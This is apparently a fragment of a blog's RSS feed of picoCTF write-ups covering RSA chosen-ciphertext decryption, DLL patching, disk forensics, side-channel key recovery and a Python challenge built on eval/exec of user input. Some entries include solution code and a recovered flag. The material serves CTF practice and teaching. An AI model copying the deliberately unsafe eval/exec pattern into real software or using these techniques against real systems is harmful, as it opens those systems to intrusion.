ciphertext: 1969221237575652521155717732207422245260989124462636800279815175985091279976278420735388546000111469136091964900122438057245980826047478280799307045156672217664430153262319375993342808217618594292553441397334562535792273632256157246548036534684500140935101268806406561259397100648254721771966657212392193037 Give me ciphertext to decrypt: 1969221237575652521155717732207422245260989124462636800279815175985091279976278420735388546000111469136091964900122438057245980826047478280799307045156672217664430153262319375993342808217618594292553441397334562535792273632256157246548036534684500140935101268806406561259397100648254721771966657212392193037 Will not decrypt the ciphertext. Try Again Exploit We know that $Enc(m_1) * Enc(m_2) = ((m_1^e) * (m_2^e))\ mod\ n = (m_1 * m_2)^e\ mod\ n = Enc(m_1 * m_2)$ $$ c’ = 2^e\ (mod\ n)*c \ \begin{align} m’ &amp;= {c’}^d\ (mod\ n) \ &amp;= 2^{ed}*c^d\ (mod\ n) \ &amp;= 2 * c^d\ (mod\ n) \ \end{align}\ m = m’ // 2 $$</description></item><item><title>PicoCTF - No way out</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---no-way-out/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---no-way-out/index.html</guid><description>PicoCTF - No way out Background C Sharp / dn.spy / cheat engine
Recon 大概有三種解法，其中兩種是改變.dll中的內容，有點利用binary exploitation的方式顯示flag，另外一種就是利用cheat engine的方式找到儲存座標的memory然後手動改寫數值，就拿到flag
Exploit Method 1 - Change .dll 可以看到No way out/pico_Data/Managed/Assembly-CSharp.dll可能是一個可以用dn.spy decompile的文件，先看看有沒有甚麼可以更改的
在APTX class中，一個Mysterious的member，而且當collision.gameObject == this.player是true的時候，this.Mysterious.SetActive(true);就會被trigger，所以這就有點像是我們在遊戲中，如果要碰到白色旗子的時候會觸發的statement，那如果我在初始化的階段就直接把this.Mysterious.SetActive(true);設定成true，是不是就可以直接拿直到flag? Implementation 直接右鍵edit class變成多加一個Start() method，然後不用任何的條件就達到剛剛說的效果，切記一定要是Start，因為Start是有被實際呼叫的method，如果取個aaa這種名字，他本來就不會被呼叫，那改成這樣也沒意義，當然，也可以取其他會被呼叫到的method name，例如Update, Awake之類的 Method 2 - Change .dll 當然記得能改動.dll的method，我們也可以改變遊戲角色跳不過圍牆的問題，最直觀的作法是我可以直接無限制的往上跳，超過圍牆就抵達flag，不會只有跳一小段這個問題，可以查看一下EvolveGames/PlayerController/Update()這個method，其中的第51行
if (Input.GetButton("Jump") &amp;&amp; this.canMove &amp;&amp; this.characterController.isGrounded &amp;&amp; !this.isClimbing) { this.moveDirection.y = this.jumpSpeed; } 如果改成</description></item><item><title>PicoCTF - not crypto</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---not-crypto/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---not-crypto/index.html</guid><description>PicoCTF - not crypto Source code :::spoiler IDA Pseudo Source COde
__int64 __fastcall main(int a1, char **a2, char **a3) { __int128 *v4; // rax unsigned __int8 v5; // di unsigned __int8 v6; // si unsigned __int8 v7; // cl unsigned __int8 v8; // dl unsigned int v9; // r8d unsigned __int8 v10; // r11 int v16; // eax __int64 v17; // rdx unsigned int v18; // r12d char *v20; // r15 unsigned __int8 v25; // r8 int v30; // esi unsigned __int8 v32; // r12 unsigned __int8 v36; // r14 unsigned __int8 v38; // dl unsigned __int8 v40; // cl char v42; // r12 char v43; // r14 char v44; // al __int64 v45; // r13 unsigned __int8 v46; // r10 unsigned __int8 v47; // bp unsigned __int8 v48; // bl unsigned __int8 v49; // r8 unsigned __int8 v50; // r11 char v51; // dl char v54; // r10 __int64 v63; // rdx char v72; // al unsigned __int8 v84; // [rsp+Ah] [rbp-1FEh] unsigned __int8 v85; // [rsp+Bh] [rbp-1FDh] int v86; // [rsp+Ch] [rbp-1FCh] int v87; // [rsp+10h] [rbp-1F8h] unsigned __int8 v88; // [rsp+14h] [rbp-1F4h] unsigned __int8 v89; // [rsp+15h] [rbp-1F3h] unsigned __int8 v90; // [rsp+16h] [rbp-1F2h] unsigned __int8 v91; // [rsp+17h] [rbp-1F1h] unsigned __int8 v92; // [rsp+18h] [rbp-1F0h] unsigned __int8 v93; // [rsp+19h] [rbp-1EFh] unsigned __int8 v94; // [rsp+1Ah] [rbp-1EEh] unsigned __int8 v95; // [rsp+1Bh] [rbp-1EDh] unsigned __int8 v96; // [rsp+1Ch] [rbp-1ECh] char v97; // [rsp+1Dh] [rbp-1EBh] char *v98; // [rsp+20h] [rbp-1E8h] unsigned __int8 v99; // [rsp+2Ah] [rbp-1DEh] char v100; // [rsp+50h] [rbp-1B8h] char v101; // [rsp+52h] [rbp-1B6h] char v102; // [rsp+54h] [rbp-1B4h] char v103; // [rsp+56h] [rbp-1B2h] char v104; // [rsp+58h] [rbp-1B0h] char v105; // [rsp+5Ah] [rbp-1AEh] char v106; // [rsp+5Ch] [rbp-1ACh] char v107; // [rsp+5Eh] [rbp-1AAh] __int128 v108; // [rsp+60h] [rbp-1A8h] char ptr[64]; // [rsp+70h] [rbp-198h] BYREF __int128 v110; // [rsp+B0h] [rbp-158h] BYREF char v111; // [rsp+C0h] [rbp-148h] BYREF char v112[15]; // [rsp+150h] [rbp-B8h] BYREF __int128 v113; // [rsp+160h] [rbp-A8h] __int128 v115[4]; // [rsp+180h] [rbp-88h] BYREF char v116; // [rsp+1C0h] [rbp-48h] BYREF unsigned __int64 v117; // [rsp+1C8h] [rbp-40h] v117 = __readfsqword(0x28u); puts("I heard you wanted to bargain for a flag... whatcha got?"); __asm { vmovdqa xmm0, cs:xmmword_21A0 } v4 = &amp;v110; v5 = -104; v6 = 50; v7 = 108; v8 = 28; __asm { vmovdqa [rsp+208h+var_158], xmm0 } v9 = 4; do { if ( (v9 &amp; 3) == 0 ) { v10 = byte_20A0[v6]; v6 = byte_20A0[v7]; v7 = byte_20A0[v8]; v8 = byte_20A0[v5]; v5 = byte_2080[v9 >> 2] ^ v10; } v5 ^= *v4; ++v9; v4 = (v4 + 4); v6 ^= *(v4 - 3); v7 ^= *(v4 - 2); v8 ^= *(v4 - 1); *(v4 + 12) = v5; *(v4 + 13) = v6; *(v4 + 14) = v7; *(v4 + 15) = v8; } while ( v9 != 44 ); __asm { vmovdqa xmm0, cs:xmmword_21B0 vmovdqa [rsp+208h+var_A8], xmm0 } fread(ptr, 1uLL, 0x40uLL, stdin); __asm { vmovdqa xmm0, cs:xmmword_21C0 vmovdqa [rsp+208h+var_88], xmm0 vmovdqa xmm0, cs:xmmword_21D0 } v108 = v110; __asm { vmovdqa [rsp+208h+var_78], xmm0 vmovdqa xmm0, cs:xmmword_21E0 vmovdqa [rsp+208h+var_68], xmm0 vmovdqa xmm0, cs:xmmword_21F0 vmovdqa [rsp+208h+var_58], xmm0 } v100 = v112[0]; v101 = v112[2]; v102 = v112[4]; v103 = v112[6]; v104 = v112[8]; v105 = v112[10]; v106 = v112[12]; v107 = v112[14]; v98 = v115; v16 = 16; do { if ( v16 == 16 ) { v20 = &amp;v111; __asm { vmovdqa xmm4, [rsp+208h+var_A8] } LOBYTE(v87) = byte_20A0[(v113 ^ v108)]; __asm { vpextrb rax, xmm4, 4 } LOBYTE(v86) = byte_20A0[(BYTE4(v108) ^ _RAX)]; v94 = byte_20A0[BYTE8(v113) ^ BYTE8(v108)]; __asm { vpextrb rax, xmm4, 0Ch } v93 = byte_20A0[(BYTE12(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 1 } v25 = byte_20A0[(BYTE1(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 5 } v85 = byte_20A0[(BYTE5(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 9 } v84 = byte_20A0[(BYTE9(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Dh } v92 = byte_20A0[(BYTE13(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 2 } LOBYTE(v30) = byte_20A0[(BYTE2(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 6 } v32 = byte_20A0[(BYTE6(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Ah } v91 = byte_20A0[(BYTE10(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Eh } v96 = v32; v88 = v25; v90 = byte_20A0[(BYTE14(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 3 } v36 = byte_20A0[(BYTE3(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 7 } v95 = v36; v38 = byte_20A0[(BYTE7(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Bh } v40 = byte_20A0[(BYTE11(v108) ^ _RAX)]; __asm { vpextrb rax, xmm4, 0Fh } v89 = byte_20A0[(HIBYTE(v108) ^ _RAX)]; do { v42 = v91 ^ v89 ^ v87 ^ v85; v99 = v87 ^ v89; v43 = v90 ^ v95 ^ v86 ^ v84; v97 = v30 ^ v38 ^ v94 ^ v92; v44 = v40 ^ v96 ^ v93 ^ v88; v45 = ((2 * (v86 ^ v95)) ^ (27 * ((v86 ^ v95) >> 7)) ^ v95 ^ v43 ^ v20[7]); v46 = v20[10] ^ v97 ^ v30 ^ (27 * ((v30 ^ v38) >> 7)) ^ (2 * (v30 ^ v38)); v47 = v20[11] ^ v97 ^ v38 ^ (2 * (v38 ^ v94)) ^ (27 * ((v38 ^ v94) >> 7)); v48 = v88 ^ v44 ^ v20[13] ^ (2 * (v88 ^ v96)) ^ (27 * ((v88 ^ v96) >> 7)); v49 = v96 ^ v44 ^ v20[14] ^ (27 * ((v40 ^ v96) >> 7)) ^ (2 * (v40 ^ v96)); v50 = v44 ^ v20[15] ^ v40 ^ (2 * (v40 ^ v93)) ^ (27 * ((v40 ^ v93) >> 7)); LOBYTE(v87) = byte_20A0[((2 * (v87 ^ v85)) ^ (27 * ((v87 ^ v85) >> 7)) ^ v42 ^ *v20 ^ v87)]; LOBYTE(v86) = byte_20A0[((2 * (v86 ^ v84)) ^ (27 * ((v86 ^ v84) >> 7)) ^ v86 ^ v43 ^ v20[4])]; v94 = byte_20A0[((2 * (v94 ^ v92)) ^ (27 * ((v94 ^ v92) >> 7)) ^ v94 ^ v97 ^ v20[8])]; v93 = byte_20A0[((27 * ((v93 ^ v88) >> 7)) ^ (2 * (v93 ^ v88)) ^ v93 ^ v20[12] ^ v44)]; v88 = byte_20A0[((2 * (v85 ^ v91)) ^ (27 * ((v85 ^ v91) >> 7)) ^ v85 ^ v42 ^ v20[1])]; v85 = byte_20A0[((27 * ((v84 ^ v90) >> 7)) ^ (2 * (v84 ^ v90)) ^ v84 ^ v43 ^ v20[5])]; v84 = byte_20A0[((27 * ((v30 ^ v92) >> 7)) ^ (2 * (v30 ^ v92)) ^ v20[9] ^ v97 ^ v92)]; v92 = byte_20A0[v48]; v51 = v91 ^ v42 ^ v20[2]; v20 += 16; v30 = byte_20A0[((2 * (v91 ^ v89)) ^ (27 * ((v91 ^ v89) >> 7)) ^ v51)]; v96 = byte_20A0[((27 * ((v90 ^ v95) >> 7)) ^ (2 * (v90 ^ v95)) ^ v43 ^ *(v20 - 10) ^ v90)]; v91 = byte_20A0[v46]; v90 = byte_20A0[v49]; v40 = byte_20A0[v47]; v38 = byte_20A0[v45]; v95 = byte_20A0[((27 * (v99 >> 7)) ^ (2 * v99) ^ v89 ^ v42 ^ *(v20 - 13))]; v89 = byte_20A0[v50]; } while ( v112 != v20 ); LOBYTE(v30) = v105 ^ v30; LOBYTE(v87) = v100 ^ v87; _R15D = v30; __asm { vmovd xmm5, r15d } v54 = v86; LOBYTE(v86) = v103 ^ v90; _R9D = (v101 ^ v91); _R10D = (v102 ^ v54); _EDX = (v107 ^ v96); _R13D = (v104 ^ v94); __asm { vmovd xmm4, edx vmovd xmm7, r9d vpinsrb xmm5, xmm5, ebx, 1 vmovd xmm3, r10d } v63 = 15LL; _ESI = (v106 ^ v93); __asm { vmovd xmm1, r13d vmovd xmm0, [rsp+208h+var_1F8] vmovd xmm6, [rsp+208h+var_1FC] vpinsrb xmm7, xmm7, [rsp+208h+var_1FD], 1 vpinsrb xmm0, xmm0, eax, 1 vpinsrb xmm1, xmm1, r11d, 1 vpunpcklwd xmm0, xmm0, xmm7 } v72 = HIBYTE(v113); __asm { vpinsrb xmm3, xmm3, [rsp+208h+var_1FE], 1 vpinsrb xmm6, xmm6, [rsp+208h+var_1F4], 1 vpunpcklwd xmm1, xmm1, xmm5 vpunpcklwd xmm3, xmm3, xmm6 vmovd xmm2, esi vpunpckldq xmm0, xmm0, xmm3 vpinsrb xmm2, xmm2, r8d, 1 vpinsrb xmm4, xmm4, ecx, 1 vpunpcklwd xmm2, xmm2, xmm4 vpunpckldq xmm1, xmm1, xmm2 vpunpcklqdq xmm0, xmm0, xmm1 vmovdqa [rsp+208h+var_98], xmm0 } if ( HIBYTE(v113) != 0xFF ) goto LABEL_14; v72 = BYTE14(v113); HIBYTE(v113) = 0; v63 = 14LL; if ( BYTE14(v113) != 0xFF ) goto LABEL_14; v72 = BYTE13(v113); BYTE14(v113) = 0; v63 = 13LL; if ( BYTE13(v113) != 0xFF ) goto LABEL_14; v72 = BYTE12(v113); BYTE13(v113) = 0; v63 = 12LL; if ( BYTE12(v113) != 0xFF ) goto LABEL_14; v72 = BYTE11(v113); BYTE12(v113) = 0; v63 = 11LL; if ( BYTE11(v113) != 0xFF ) goto LABEL_14; v72 = BYTE10(v113); BYTE11(v113) = 0; v63 = 10LL; if ( BYTE10(v113) != 0xFF ) goto LABEL_14; v72 = BYTE9(v113); BYTE10(v113) = 0; v63 = 9LL; if ( BYTE9(v113) != 0xFF ) goto LABEL_14; v72 = BYTE8(v113); BYTE9(v113) = 0; v63 = 8LL; if ( BYTE8(v113) != 0xFF ) goto LABEL_14; v72 = BYTE7(v113); BYTE8(v113) = 0; v63 = 7LL; if ( BYTE7(v113) != 0xFF ) goto LABEL_14; v72 = BYTE6(v113); BYTE7(v113) = 0; v63 = 6LL; if ( BYTE6(v113) != 0xFF ) goto LABEL_14; v72 = BYTE5(v113); BYTE6(v113) = 0; v63 = 5LL; if ( BYTE5(v113) != 0xFF ) goto LABEL_14; v72 = BYTE4(v113); BYTE5(v113) = 0; v63 = 4LL; if ( BYTE4(v113) != 0xFF ) goto LABEL_14; v72 = BYTE3(v113); BYTE4(v113) = 0; v63 = 3LL; if ( BYTE3(v113) != 0xFF ) goto LABEL_14; v72 = BYTE2(v113); BYTE3(v113) = 0; v63 = 2LL; if ( BYTE2(v113) != 0xFF ) goto LABEL_14; v72 = BYTE1(v113); BYTE2(v113) = 0; v63 = 1LL; if ( BYTE1(v113) == 0xFF &amp;&amp; (v72 = v113, BYTE1(v113) = 0, v63 = 0LL, v113 == 0xFF) ) { LOBYTE(v113) = 0; v16 = 0; } else { LABEL_14: *(&amp;v113 + v63) = v72 + 1; v16 = 0; } } v17 = v16++; *v98++ ^= *(&amp;v115[-1] + v17); } while ( &amp;v116 != v98 ); v18 = memcmp(v115, ptr, 0x40uLL); if ( v18 ) { v18 = 1; puts("Nope, come back later"); } else { puts("Yep, that's it!"); } return v18; } :::</description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---notepad/index.html</guid><description>PicoCTF - notepad Background Flask實作_基礎_03_簡述url_for與route werkzeug.url_fix
Source code Recon Exploit Reference</description></item><item><title>PicoCTF - NSA Backdoor</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/index.html</guid><description>PicoCTF - NSA Backdoor tags: PicoCTF CTF Crypto Background Baby Step Giant Step - BSGS
用来解决如下方程最小正整數解的 $A^x\equiv B(mod\ C)$，其中$0\le x\lt C$ 如果$A\ge C, B\ge C$，那麼我們可以先取模，即$A% = C, B% = C$，所以在這裡我們只討論$0\le A, B\lt C$的情況。 普通的BSGS的步驟是這樣的：
首先確定$x$的下限是$0$，上限是$C$，我們令$M=\lceil C\rceil$ 把$A^0~A^M\ mod\ C$的值存到一个Hash表裡面 把$(A^M)^0~(A^M)^M\ mod\ C$的值一一枚舉出來，每枚舉一個就在Hash表裡面尋找是否有一個$val$值滿足$val \cdot (A^M)^i\ mod\ C=B$，如果有則找到答案，否則繼續 最終答案就是$i\cdot M+val$的值對應的原來$A$的冪 上面是普通Baby Step Giant Step的步驟，比較簡單，只適用為素數的情況。如果為合數呢？ 拓展的過程詳見全文
離散對數問題 - pohlig-hellman算法講解
需要注意的是，pohlig-hellman算法的覆雜度在一般情況下比BSGS高！ 因此，使用pohlig-hellman的場合只能是較為特殊的情況，即:$p$是質數，且$p-1$包含的質因子較少&amp;較小。
和BSGS算法一樣，pohlig-hellman算法也是用於解決離散對數問題（也有很多文獻提到是解決橢圓曲線之類的）。即給定$a,b,p$,求 $a^x \equiv b(mod\ p)$。
歐拉定理: 若$(a,p)=1$，那麽$a^{φ(p)} \equiv1(mod\ p)······(*)$ 證明略。
費馬小定理: 如果$p$是質數，那$φ(p)=p-1$。</description></item><item><title>PicoCTF - Operation Oni</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-oni/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-oni/index.html</guid><description>PicoCTF - Operation Oni Background How to View Your SSH Keys in Linux, macOS and Windows
ISO和IMG有哪些區別
ISO和IMG的區別 ISO和IMG都是操作系統鏡像文件的擴展名，它們的主要區別在以下幾個方面：
來源不同 ISO文件通常來自光盤鏡像，例如Windows安裝光盤的ISO鏡像文件。而IMG文件可以來自多種渠道，例如從移動設備制造商下載的Android操作系統鏡像文件，或者是從虛擬機軟件中制作的虛擬機磁盤鏡像文件。 文件格式不同 ISO文件使用ISO 9660標準格式，而IMG文件可以使用多種格式，例如RAW、VMDK、VDI等。 兼容性不同 ISO文件在各種操作系統和軟件中都有良好的兼容性，而IMG文件在一些操作系統或軟件中可能存在兼容性問題。 使用範圍不同 ISO文件主要用於制作光盤或者USB啟動盤，用於安裝操作系統或者救援系統等。而IMG文件主要用於移動設備或者虛擬機等環境下的操作系統安裝或備份。 總之，ISO和IMG都是操作系統鏡像文件的擴展名，雖然它們在一些方面有類似之處，但在來源、文件格式、兼容性和使用範圍等方面存在差異，應根據具體的需求來選擇使用哪種格式。 Description Download this disk image, find the key and log into the remote machine. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.
Download disk image Remote machine: ssh -i key_file -p 59801 ctf-player@saturn.picoctf.net Recon 這一題和DF有關，主要就是分析拿到的img file，可以用Autopsy之類的分析軟體</description></item><item><title>PicoCTF - Operation Orchid</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-orchid/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---operation-orchid/index.html</guid><description>PicoCTF - Operation Orchid Recon 這一題過於簡單
Exploit - Forensics / Openssl Find Encryption Flag File(Autopsy) 可以在/root中找到，然後.ash_history的command紀錄中知道加密的password phrase touch flag.txt nano flag.txt apk get nano apk --help apk add nano nano flag.txt openssl openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567 shred -u flag.txt ls -al halt Script
$ openssl aes-256-cbc -in flag.txt.enc -d enter aes-256-cbc decryption password: *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. bad decrypt 140342062343488:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:crypto/evp/evp_enc.c:612: picoCTF{h4un71ng_p457_5113beab}%</description></item><item><title>PicoCTF - OTP Implementation</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---otp-implementation/index.html</guid><description>PicoCTF - OTP Implementation Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // al char v5; // dl unsigned int v6; // eax int i; // [rsp+18h] [rbp-E8h] int j; // [rsp+1Ch] [rbp-E4h] char input_key[112]; // [rsp+20h] [rbp-E0h] BYREF char tmp_key[104]; // [rsp+90h] [rbp-70h] BYREF unsigned __int64 v11; // [rsp+F8h] [rbp-8h] v11 = __readfsqword(0x28u); if ( argc > 1 ) { strncpy(input_key, argv[1], 0x64uLL); input_key[100] = 0; for ( i = 0; valid_char(input_key[i]); ++i )// 確認字元是否在[0-9|a-f]之間 { if ( i ) { v4 = jumble(input_key[i]); v5 = tmp_key[i - 1] + v4; v6 = ((tmp_key[i - 1] + v4) >> 31) >> 28; tmp_key[i] = ((v6 + v5) &amp; 0xF) - v6; } else { tmp_key[0] = jumble(input_key[0]) % 16; } } for ( j = 0; j &lt; i; ++j ) tmp_key[j] += 0x61; if ( i == 100 &amp;&amp; !strncmp( tmp_key, "bajbgfapbcclgoejgpakmdilalpomfdlkngkhaljlcpkjgndlgmpdgmnmepfikanepopbapfkdgleilhkfgilgabldofbcaedgfe", 100uLL) ) { puts("You got the key, congrats! Now xor it with the flag!"); return 0; } else { puts("Invalid key!"); return 1; } } else { printf("USAGE: %s [KEY]\n", *argv); return 1; } } :::</description></item><item><title>PicoCTF - Picker III</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---picker-iii/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---picker-iii/index.html</guid><description>PicoCTF - Picker III Source code :::spoiler Source Code
import re USER_ALIVE = True FUNC_TABLE_SIZE = 4 FUNC_TABLE_ENTRY_SIZE = 32 CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to fix it' func_table = '' def reset_table(): global func_table # This table is formatted for easier viewing, but it is really one line func_table = \ '''\ print_table \ read_variable \ write_variable \ getRandomNumber \ ''' def check_table(): global func_table if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE): return False return True def get_func(n): global func_table # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Get function name from table func_name = '' func_name_offset = n * FUNC_TABLE_ENTRY_SIZE for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE): if( func_table[i] == ' '): func_name = func_table[func_name_offset:i] break if( func_name == '' ): func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE] return func_name def print_table(): # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return for i in range(0, FUNC_TABLE_SIZE): j = i + 1 print(str(j)+': ' + get_func(i)) def filter_var_name(var_name): r = re.search('^[a-zA-Z_][a-zA-Z_0-9]*$', var_name) if r: return True else: return False def read_variable(): var_name = input('Please enter variable name to read: ') if( filter_var_name(var_name) ): eval('print('+var_name+')') else: print('Illegal variable name') def filter_value(value): if ';' in value or '(' in value or ')' in value: return False else: return True def write_variable(): var_name = input('Please enter variable name to write: ') if( filter_var_name(var_name) ): value = input('Please enter new value of variable: ') if( filter_value(value) ): exec('global '+var_name+'; '+var_name+' = '+value) else: print('Illegal value') else: print('Illegal variable name') def call_func(n): """ Calls the nth function in the function table. Arguments: n: The function to call. The first function is 0. """ # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Check n if( n &lt; 0 ): print('n cannot be less than 0. Aborting...') return elif( n >= FUNC_TABLE_SIZE ): print('n cannot be greater than or equal to the function table size of '+FUNC_TABLE_SIZE) return # Get function name from table func_name = get_func(n) # Run the function eval(func_name+'()') def dummy_func1(): print('in dummy_func1') def dummy_func2(): print('in dummy_func2') def dummy_func3(): print('in dummy_func3') def dummy_func4(): print('in dummy_func4') def getRandomNumber(): print(4) # Chosen by fair die roll. # Guaranteed to be random. # (See XKCD) def win(): # This line will not work locally unless you create your own 'flag.txt' in # the same directory as this script flag = open('flag.txt', 'r').read() #flag = flag[:-1] flag = flag.strip() str_flag = '' for c in flag: str_flag += str(hex(ord(c))) + ' ' print(str_flag) def help_text(): print( ''' This program fixes vulnerabilities in its predecessor by limiting what functions can be called to a table of predefined functions. This still puts the user in charge, but prevents them from calling undesirable subroutines. * Enter 'quit' to quit the program. * Enter 'help' for this text. * Enter 'reset' to reset the table. * Enter '1' to execute the first function in the table. * Enter '2' to execute the second function in the table. * Enter '3' to execute the third function in the table. * Enter '4' to execute the fourth function in the table. Here's the current table: ''' ) print_table() reset_table() while(USER_ALIVE): choice = input('==> ') if( choice == 'quit' or choice == 'exit' or choice == 'q' ): USER_ALIVE = False elif( choice == 'help' or choice == '?' ): help_text() elif( choice == 'reset' ): reset_table() elif( choice == '1' ): call_func(0) elif( choice == '2' ): call_func(1) elif( choice == '3' ): call_func(2) elif( choice == '4' ): call_func(3) else: print('Did not understand "'+choice+'" Have you tried "help"?') :::</description></item><item><title>PicoCTF - Pitter, Patter, Platters</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/index.html</guid><description>PicoCTF - Pitter, Patter, Platters tags: PicoCTF CTF Misc Challenge: Pitter, Patter, Platters
Background sda
Source code Exploit - Use FTK Imager I use Autopsy but find nothing except a txt file So I follow write up video to use FTK imager and it can parse files completely. ORRRR…
Use HxD as auxiliary tool to find flag ORRRR…</description></item><item><title>PicoCTF - PowerAnalysis Part 1 / Part 2</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/index.html</guid><description>PicoCTF - PowerAnalysis Part 1 / Part 2 Background Simple Welcome 0x13(2023 HW - Power Analysis):two:
Recon 這一題幾乎就和上課教的差不多，只是因為有雜訊，所以要慎選trace point，我是直接看第一個trace的分布，決定採用300~400的point，而不管是利用自己刻的correlation coefficient還是用scipy的pearsonr都一樣可以順利解出key但是如果像homework一樣用numpy的corrcoef會有兩個bytes和正解不一樣，超哭，找超久(10/18更新，如果用自己刻的也是要碰用氣，所以如果可以的話，多送幾個trace，或者多用幾個算correlation coefficient的library) Part 2的部分幾乎一模一樣，就只是他先幫你紀錄好所有的trace，再讓我們做後續的分析 Exploit 首先先把資料從server拉下來，在存成json from pwn import * from string import ascii_letters, digits import json from tqdm import trange def gen_plaintext(length): return ''.join(random.choice(ascii_letters + digits) for _ in range(length)) pt = [gen_plaintext(16) for _ in range(50)] print(pt) json_file = [None] * len(pt) for i in trange(len(pt)): r = remote('saturn.picoctf.net', 52339) r.sendlineafter(b'hex: ', pt[i].encode('utf-8').hex().encode()) r.recvuntil(b'power measurement result: ') pm = r.recvline().decode().strip() json_file[i] = {} json_file[i]["pt"] = [ord(digit) for digit in pt[i]] json_file[i]["pm"] = pm r.close() json_object = json.dumps(json_file) with open("./Crypto/PowerAnalysis- Part 1/trace.json", 'w') as outfile: outfile.write(json_object) 然後再去解析AES key import json from tqdm import trange import numpy as np import copy from string import ascii_letters, digits from numpy import corrcoef import matplotlib.pyplot as plt from scipy.stats import pearsonr jsonFile = open('./PicoCTF/Crypto/PowerAnalysis- Part 1/trace.json', 'r') j = json.load(jsonFile) s_box = [ [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76], [0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0], [0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15], [0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75], [0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84], [0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF], [0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8], [0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2], [0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73], [0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB], [0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 